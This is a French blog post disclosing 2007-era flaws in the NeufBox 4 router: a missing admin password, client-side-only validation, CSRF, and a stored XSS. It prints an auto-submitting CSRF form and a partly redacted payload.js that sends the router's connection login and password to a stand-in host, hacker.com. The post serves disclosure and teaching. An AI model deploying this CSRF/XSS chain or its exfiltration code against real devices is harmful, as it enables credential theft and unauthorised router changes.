---
title: "La sécurité de la NeufBox 4"
tags: [vulnérabilité]
---

**NB: Cet article date de septembre 2007. La sécurité de la NeufBox s'est fortement amélioré depuis et l'accès à l'interface nécessite un mot de passe.**  

![NeufBox 4](/assets/img/neufbox4.jpg)

Je me suis intéressé à la sécurité de la NeufBox 4 ces derniers temps, je vous fais part de mes découvertes.  

## Welcome  

Une fois le modem/routeur branché et configuré (saisie des identifiants de connexion), différents voyants s'allument en fonction des services auxquels vous avez souscrit et des périphériques que vous avez branché. Mais force est de constater que par défaut le voyant WiFi s'allume.  

Le WiFi est actif et un hotspot accueille gentiment les *utilisateurs de la communauté Neuf et FON*. Il y a fort à parier que cet accès intéressera aussi certains *"pirates de l'air"*.  

Pour désactiver tout ça, il faut se rendre sur l'interface d'administration (`192.168.1.1`), dans la section *Wifi* puis *Hotspot* et *Wifi* (si vos PCs ne sont pas reliés par WiFi).  
Si vous voulez voir à quoi ressemble l'interface d'administration de la NeufBox 4, vous pouvez visiter le site <http://antoniop.free.fr/nb4/> qui a recréé l'interface.  

## Pas de mot de passe

Ce qui surprend le plus en accédant à l'interface web de la NeufBox, c'est l'absence d'une demande d'identifiants. Les modems ont généralement un compte par défaut du type admin/admin ou admin/password. Des mots de passe par défaut que l'on devine facilement, mais avec la possibilité d'en changer.  

Cette absence de protection est très gênante, dans un environnement multi-utilisateurs chacun pouvant jouer avec les règles NAT pour y faire passer son MSN et faire tourner son client P2P au nez et à la barbe de l'administrateur, même si on voit difficilement une entreprise utiliser ce type d'équipement (mais on ne sait jamais...)  

Est-il possible d'activer une protection par mot de passe ? Une [page cachée](http://antoniop.free.fr/nb4/0_2.htm) dans l'interface laisse supposer que oui. En fait, c'est possible [techniquement parlant. Il faut que les équipes de Neuf le mettent en place, mais ils peuvent le faire](http://www.n9ws.com/forum/viewtopic.php?t=43168). (je trouve ça fort, on dirait du [Pierre Dac](http://www.youtube.com/watch?v=B71_p-Lvn8s) ou du [Laspales/Chevallier](http://www.dailymotion.com/relevance/search/laspales/video/x2huio_chevallier-et-laspales-le-train-pou_fun)... c'est vous qui voyez !)  

## Cross-Site Request Forgery

L'absence de mot de passe à saisir pour accéder à la partie administration fait de la NeufBox 4, une cible de choix pour les attaques par [Cross-site request forgery](http://devloop.users.sourceforge.net/index.php?article17/les-attaques-par-cross-site-request-forgery).  

À l'aide d'une page web malicieuse, il est possible de vous faire changer la configuration de votre modem sans que vous ne vous en rendiez compte.  

Il est alors possible de réactiver un hotspot désactivé, changer la clé et le type de chiffrement WiFi ou encore ajouter des entrées NAT pour accéder à des services potentiellement vulnérables sur votre machine (le DHCP activé par défaut donne toujours les mêmes adresses).  

## Des protections Javascript seulement

On peut entrer à peu près tout ce qu'on le veut dans l'interface web de la NB4. Les seules protections se basent sur le HTML et le Javascript (donc côté client).  

Par exemple pour rajouter des règles NAT, il faut saisir l'adresse IP répartie en 4 cases de texte (voir [ici](http://antoniop.free.fr/nb4/2_5.htm)). Les trois premières cases sont protégées en écriture par HTML (attribut `readonly="readonly"`) mais en modifiant la requête HTTP (par exemple à l'aide de l'extension Firefox [TamperData](http://tamperdata.mozdev.org/)) on peut y mettre n'importe quelle adresse IP.  

Heureusement dans le cas du NAT ça finit par bloquer quelque part (sans doute lors du passage en règle iptables) sans quoi il aurait été possible de transformer les NeufBox en proxies.  

## XSS et lecture de données

La NB4 est victime de quelques failles XSS. La plus simple à exploiter est sans doute celle qui touche [le service FTP](http://antoniop.free.fr/nb4/5_1.htm), plus précisément l'ajout d'un compte utilisateur. La encore les seules protections sont le HTML (champs de taille limités) et le Javascript (vérification des caractères utilisés).  

L'injection de Javascript dans le champ *"Nom d'utilisateur"* ou *"Mot de passe"* résulte en un XSS permanent.  

Avec le CSRF (Cross-Site Request Forgery), on ne peut qu'envoyer des données vers la NeufBox mais on ne peut pas en lire. Avec [AJAX](http://fr.wikipedia.org/wiki/Asynchronous_JavaScript_and_XML) il est possible d'envoyer des requêtes et de lire le résultat, mais les restrictions d'AJAX empêchent la communication d'un domaine à un autre.  

La faille XSS permet de bypasser cette protection puisque le Javascript est injecté dans la page et exécuté comme s'il provenait de la NeufBox elle-même.  

Je me suis attardé sur cette faille et je suis parvenu à créer un code qui récupère les identifiants de connexion de la NeufBox (ceux-ci sont enregistrés et restent présent dans le code [de la page WAN](http://antoniop.free.fr/nb4/2_1.htm)) pour les soumettre ensuite vers un site extérieur.  

Je ne vous donne pas l'intégralité du code pour des raisons évidentes, mais n'importe quel développeur AJAX est en mesure de le faire (en une après-midi c'était torché, sachant que je n'avais jamais vraiment fait de l'AJAX auparavant, juste quelques codes de test).  

On a un code qui se charge du CSRF, c'est seulement un formulaire qui s'*"auto-submit"* :  

```html
<form method="post" action="http://192.168.1.1/5_1" id="inject">
<input type="hidden" name="ftpd_user" value="<script src='http://hacker.com/payload.js'></script>"/>
<input type="hidden" name="ftpd_password" value="hacked"/>
<input type="hidden" name="action" value="add" />
<input type="hidden" name="row" value="1" />
</form>
<script language="Javascript">
document.getElementById("inject").submit();
</script>
```

Le script injecté (payload.js) effectue les opérations suivantes :  

* Envoie une requête pour accéder à la page WAN
* Extrait les informations de connexion
* Charge dynamiquement dans la structure DOM un script pour l'envoi des identifiants
* Supprime l'entrée ajoutée dans la page du service FTP où se trouve le code Javascript

```js
var req = false;
var obj=null;
if(window.XMLHttpRequest)
{
  req=new XMLHttpRequest();
}
else if(window.ActiveXObject)
{
  req=new ActiveXObject("Microsoft.XMLHTTP");
}
req.open("GET","/2_1");
req.onreadystatechange=function()
{
  if(req.readyState==4 && req.status==200)
  {
    // code retire : extraction des données d'indentification
    var script = document.createElement('script');
    script.src = "http://hacker.com/insert.php?login="+escape(login)+"&password="+escape(password);
    script.type = 'text/javascript';
    document.body.appendChild(script);

    if(window.XMLHttpRequest)
    {
      req=new XMLHttpRequest();
    }
    else if(window.ActiveXObject)
    {
      req=new ActiveXObject("Microsoft.XMLHTTP");
    }
    // code retire : suppression des traces de l'attaque
  }
}
req.send(null);
```

J'ai testé le script en local et il a fonctionné avec succès sous Internet Explorer 7, Opera 9.50 (dernière pré-release de Kestrel en date) et Firefox 2.0.0.5.  

Par contre, ne me demandez pas à quoi peut bien servir de récupérer les infos de connexion... puisqu'il faut un abonnement (donc il faut forcément payer) pour les utiliser. Mais l'objectif était seulement de montrer les possibilités données par le mélange CSRF et XSS.  

Tout ça aurait pu être évité si un mot de passe était demandé par l'interface. On peut bien-sûr envoyer des informations d'authentification par AJAX (paramètres supplémentaires de `open()`) et dans un formulaire HTML (URL de la forme,<http://login:password@192.168.1.1/)> mais les navigateurs donnent un avertissement (cette forme d'URL a été massivement utilisée pour les attaques de phishing).  

Le mieux est d'avoir la possibilité de changer le mot de passe de l'interface, mais à l'heure actuelle rien n'est possible.  

Notez toutefois que l'utilisation de l'[extension NoScript](http://noscript.net/?ver=1.1.7.2&prev=#xss) sous Firefox permet de bloquer le CSRF.  

J'ai aussi testé l'injection de commandes Unix dans certains champs web, mais je n'ai rien trouvé de probant (je n'ai pas trop poussé non plus).  

Références :  

[W3C : XMLHttpRequest](http://www.xul.fr/XMLHttpRequest.html)  

[Using POST method in XMLHTTPRequest](http://www.openjs.com/articles/ajax_xmlhttp_using_post.php)  

[HTTP Authentication with HTML Forms](http://www.peej.co.uk/articles/http-auth-with-html-forms.html)  

[Cross-Domain Ajax Insecurity](http://shiflett.org/blog/2006/aug/cross-domain-ajax-insecurity)  

[MySpace Worm explanation](http://namb.la/popular/tech.html)

*Published January 10 2011 at 09:00*
